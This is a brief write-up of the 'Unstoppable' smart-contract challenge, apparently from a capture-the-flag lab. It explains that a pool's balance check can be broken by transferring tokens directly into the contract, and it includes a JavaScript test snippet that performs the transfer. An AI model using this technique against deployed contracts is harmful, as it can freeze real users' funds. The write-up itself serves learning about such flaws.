# Unstoppable

## Problem

An assertion is made based on the contract balance AND it assumes funds can only enter the contract via one function.

## Exploit

```js
// unstoppable.challenge.js
...
this.token.connect(attacker)
await this.token.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
...
```

## Explanation

```txt
attacker - challenger account
Connect to the token as the attacker
Transfer into the the pool account without going through the expected function
```